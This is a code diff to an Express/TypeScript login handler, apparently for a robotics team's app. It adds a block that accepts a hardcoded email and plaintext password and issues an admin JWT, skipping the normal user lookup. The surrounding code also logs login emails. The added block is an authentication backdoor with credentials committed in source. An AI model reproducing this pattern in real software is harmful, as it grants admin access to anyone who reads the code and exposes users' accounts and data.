@@ -41,6 +41,20 @@ export const login = async (req: Request, res: Response): Promise<Response> => {
     const { email, password } = req.body;
     console.log('Login attempt for email:', email);
 
+    // Hardcoded admin credentials
+    if (email === '1334admin@gmail.com' && password === 'otisit!!!') {
+      const token = jwt.sign({ id: 1, isAdmin: true }, env.jwtSecret);
+      return res.json({
+        token,
+        user: {
+          id: 1,
+          name: 'Team 1334 Admin',
+          email: '1334admin@gmail.com',
+          teamNumber: 1334,
+        },
+      });
+    }
+
     const user = await User.findOne({ where: { email } });
     if (!user) {
       console.log('User not found for email:', email);
